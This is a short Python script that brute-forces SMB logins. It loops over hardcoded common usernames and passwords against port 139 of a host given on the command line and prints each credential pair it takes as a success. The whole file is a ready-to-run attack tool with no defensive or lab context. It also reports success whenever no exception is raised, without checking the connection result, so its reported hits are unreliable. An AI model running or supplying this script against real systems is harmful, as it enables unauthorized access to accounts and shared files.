import sys
from smb.SMBConnection import SMBConnection

def brute_force_smb(host, user_list, pass_list):
    for username in user_list:
        for password in pass_list:
            try:
                conn = SMBConnection(username, password, 'loki', host, use_ntlm_v2=True)
                conn.connect(host, 139)
                print(f"Success: {username}:{password}")
                conn.close()
            except Exception:
                pass

if __name__ == "__main__":
    host = sys.argv[1]
    user_list = ["admin", "guest", "user"]
    pass_list = ["admin", "password", "123456"]
    brute_force_smb(host, user_list, pass_list)
